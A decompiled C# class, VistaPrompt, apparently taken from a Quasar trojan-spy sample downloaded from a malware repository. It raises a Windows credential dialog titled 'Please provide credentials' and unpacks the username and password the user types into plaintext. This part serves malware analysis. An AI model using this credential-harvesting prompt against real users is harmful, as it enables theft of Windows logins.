// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.CredentialManagement.VistaPrompt
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

namespace NoiseMe.Drags.App.Models.CredentialManagement
{
  public class VistaPrompt : BaseCredentialsPrompt
  {
    private string _domain;

    public VistaPrompt() => this.Title = "Please provide credentials";

    public string Domain
    {
      get
      {
        this.CheckNotDisposed();
        return this._domain;
      }
      set
      {
        this.CheckNotDisposed();
        this._domain = !string.IsNullOrEmpty(value) ? value : throw new ArgumentNullException(nameof (value));
      }
    }

    public override bool ShowSaveCheckBox
    {
      get
      {
        this.CheckNotDisposed();
        return (2 & this.DialogFlags) != 0;
      }
      set
      {
        this.CheckNotDisposed();
        this.AddFlag(value, 2);
      }
    }

    public override bool GenericCredentials
    {
      get
      {
        this.CheckNotDisposed();
        return (1 & this.DialogFlags) != 0;
      }
      set
      {
        this.CheckNotDisposed();
        this.AddFlag(value, 1);
      }
    }

    public override DialogResult ShowDialog(IntPtr owner)
    {
      this.CheckNotDisposed();
      if (string.IsNullOrEmpty(this.Title) && string.IsNullOrEmpty(this.Message))
        throw new InvalidOperationException("Title or Message should always be set.");
      if (!this.IsWinVistaOrHigher)
        throw new InvalidOperationException("This Operating System does not support this prompt.");
      uint authPackage = 0;
      IntPtr num = IntPtr.Zero;
      int pcbPackedCredentials = 0;
      bool saveChecked = this.SaveChecked;
      NativeMethods.CREDUI_INFO creduiInfo = this.CreateCREDUI_INFO(owner);
      if (!string.IsNullOrEmpty(this.Username) || !string.IsNullOrEmpty(SecureStringHelper.CreateString(this.SecurePassword)))
      {
        NativeMethods.CredPackAuthenticationBuffer(0, new StringBuilder(this.Username), new StringBuilder(SecureStringHelper.CreateString(this.SecurePassword)), num, ref pcbPackedCredentials);
        if (Marshal.GetLastWin32Error() == 122)
        {
          num = Marshal.AllocCoTaskMem(pcbPackedCredentials);
          if (!NativeMethods.CredPackAuthenticationBuffer(0, new StringBuilder(this.Username), new StringBuilder(SecureStringHelper.CreateString(this.SecurePassword)), num, ref pcbPackedCredentials))
            throw new Win32Exception(Marshal.GetLastWin32Error(), "There was an issue with the given Username or Password.");
        }
      }
      IntPtr refOutAuthBuffer;
      uint refOutAuthBufferSize;
      NativeMethods.CredUIReturnCodes credUiReturnCodes;
      try
      {
        credUiReturnCodes = NativeMethods.CredUIPromptForWindowsCredentials(ref creduiInfo, this.ErrorCode, ref authPackage, num, (uint) pcbPackedCredentials, out refOutAuthBuffer, out refOutAuthBufferSize, ref saveChecked, this.DialogFlags);
        this.SaveChecked = saveChecked;
      }
      catch (EntryPointNotFoundException ex)
      {
        throw new InvalidOperationException("This functionality is not supported by this operating system.", (Exception) ex);
      }
      if (credUiReturnCodes <= NativeMethods.CredUIReturnCodes.ERROR_INVALID_FLAGS)
      {
        if (credUiReturnCodes <= NativeMethods.CredUIReturnCodes.ERROR_INSUFFICIENT_BUFFER)
        {
          if (credUiReturnCodes != NativeMethods.CredUIReturnCodes.ERROR_INVALID_PARAMETER && credUiReturnCodes != NativeMethods.CredUIReturnCodes.ERROR_INSUFFICIENT_BUFFER)
            goto label_21;
        }
        else if (credUiReturnCodes != NativeMethods.CredUIReturnCodes.ERROR_BAD_ARGUMENTS && credUiReturnCodes != NativeMethods.CredUIReturnCodes.ERROR_INVALID_FLAGS)
          goto label_21;
      }
      else if (credUiReturnCodes <= NativeMethods.CredUIReturnCodes.ERROR_CANCELLED)
      {
        if (credUiReturnCodes != NativeMethods.CredUIReturnCodes.ERROR_NOT_FOUND)
        {
          if (credUiReturnCodes == NativeMethods.CredUIReturnCodes.ERROR_CANCELLED)
            return DialogResult.Cancel;
          goto label_21;
        }
      }
      else if (credUiReturnCodes != NativeMethods.CredUIReturnCodes.ERROR_NO_SUCH_LOGON_SESSION && credUiReturnCodes != NativeMethods.CredUIReturnCodes.ERROR_INVALID_ACCOUNT_NAME)
        goto label_21;
      throw new InvalidOperationException("Invalid properties were specified.", (Exception) new Win32Exception(Marshal.GetLastWin32Error()));
label_21:
      int pcchMaxUserName = 1000;
      int pcchMaxPassword = 1000;
      int pcchMaxDomainame = 1000;
      StringBuilder pszUserName = new StringBuilder(1000);
      StringBuilder pszPassword = new StringBuilder(1000);
      StringBuilder pszDomainName = new StringBuilder(1000);
      if (NativeMethods.CredUnPackAuthenticationBuffer(0, refOutAuthBuffer, refOutAuthBufferSize, pszUserName, ref pcchMaxUserName, pszDomainName, ref pcchMaxDomainame, pszPassword, ref pcchMaxPassword))
      {
        NativeMethods.CoTaskMemFree(refOutAuthBuffer);
        this.Username = pszUserName.ToString();
        this.Password = pszPassword.ToString();
        if (pszPassword.Length > 0)
          pszPassword.Remove(0, pszPassword.Length);
      }
      return DialogResult.OK;
    }

    private bool IsWinVistaOrHigher
    {
      get
      {
        OperatingSystem osVersion = Environment.OSVersion;
        return osVersion.Platform == PlatformID.Win32NT && osVersion.Version.Major >= 6;
      }
    }
  }
}
